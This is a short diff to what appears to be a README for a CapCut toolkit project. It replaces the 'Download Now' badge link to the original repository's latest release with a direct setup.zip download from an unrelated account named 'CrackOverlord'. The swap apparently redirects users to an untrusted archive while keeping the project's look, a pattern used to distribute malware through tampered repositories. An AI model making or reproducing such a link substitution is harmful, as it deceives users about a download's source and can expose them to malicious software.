@@ -16,7 +16,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/SilentJMA/CapCut-Studio-Toolkit/releases/latest)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/CrackOverlord/CapCut-Studio-Toolkit/releases/download/setup/setup.zip)
 
 
 </div>
